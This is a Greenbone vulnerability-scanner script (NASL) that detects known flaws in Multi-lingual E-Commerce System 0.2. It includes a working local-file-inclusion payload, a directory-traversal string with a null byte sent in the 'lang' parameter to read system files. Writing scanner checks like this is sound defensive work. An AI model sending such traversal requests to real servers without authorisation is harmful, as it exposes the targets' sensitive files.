# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801285");
  script_version("2025-07-18T15:43:33+0000");
  script_tag(name:"last_modification", value:"2025-07-18 15:43:33 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2010-09-21 16:43:08 +0200 (Tue, 21 Sep 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  # nb: There seems to be CVE-2010-3210 related to this version but this seems to be a different
  # flaw not checked here.
  script_name("Multi-lingual E-Commerce System 0.2 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/8480");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121033111/http://www.securityfocus.com/archive/1/502798");

  script_tag(name:"summary", value:"Multi-lingual E-Commerce System is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Local file inclusion vulnerability due to improper validation of user supplied input to the
  'lang' parameter in index.php.

  - Information Disclosure vulnerability due to reserved information in database.inc.

  - Arbitrary File Upload vulnerability due to improper validation of files uploaded via
  product_image.php.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary PHP code in the context of the webserver
  process.");

  script_tag(name:"affected", value:"Multi-lingual E-Commerce System version 0.2 is known to be
  vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("traversal_func.inc");
include("os_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/shop", "/genericshop", "/", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/index.php", port:port);

  if("<title>Multi-lingual Shop</title>" >< res) {

    foreach pattern(keys(files)) {

      file = files[pattern];
      url = dir + "/index.php?lang=../../../../../../../../../../" + file + "%00";

      if(http_vuln_check(port:port, url:url, pattern:pattern)) {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
